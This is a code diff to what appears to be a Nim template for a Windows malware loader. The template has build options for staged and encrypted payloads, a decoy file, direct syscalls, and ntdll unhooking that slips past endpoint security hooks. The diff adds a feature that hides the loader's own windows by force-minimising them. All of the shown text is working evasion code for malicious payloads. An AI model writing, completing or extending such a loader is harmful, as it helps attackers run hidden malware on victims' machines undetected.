@@ -1,7 +1,6 @@
 import winim
 import winim/com
-
-when defined unhook:
+when (defined unhook) or (defined hidewindow):
   import ptr_math
 import std/strutils
 when defined staged:
@@ -17,13 +16,13 @@ when defined encrypted:
 include syscalls
 
 
-
+proc toString(bytes: openarray[byte]): string =
+  result = newString(bytes.len)
+  copyMem(result[0].addr, bytes[0].unsafeAddr, bytes.len)
 proc NimMain() {.cdecl, importc.}
 
 when defined unhook:
-  proc toString(bytes: openarray[byte]): string =
-    result = newString(bytes.len)
-    copyMem(result[0].addr, bytes[0].unsafeAddr, bytes.len)
+
 
   proc ntdll_mapviewoffile() =
     let low: uint16 = 0
@@ -75,12 +74,24 @@ when defined unhook:
     CloseHandle(ntdllMapping)
     FreeLibrary(ntdllModule)
           
+when defined hidewindow:
+  proc wndenumcallback(windowHandle: HWND, param: LPARAM): WINBOOL {.stdcall.} = 
+    var process_id: DwORD
+    var wanted = cast[ptr DWORD](param)
+    GetWindowThreadProcessId(windowHandle, &process_id);
+    if process_id == wanted[]:
+            ShowWindow(windowHandle, SW_FORCEMINIMIZE)
+    return true
+  
+  proc hidewindow() = 
+    var processID = GetCurrentProcessId();
+    EnumWindows(wndenumcallback, cast[LPARAM](addr processID))
+
 
 
 proc run() {.thread, gcsafe.} =
   when defined hidewindow:
-    # TODO: add window hiding (FindWindow+ShowWindow does not work for some reason)
-    echo "COMING SOON"
+    hidewindow()
 
   when defined decoy:
     const asset = slurp("%DECOYPATH%")
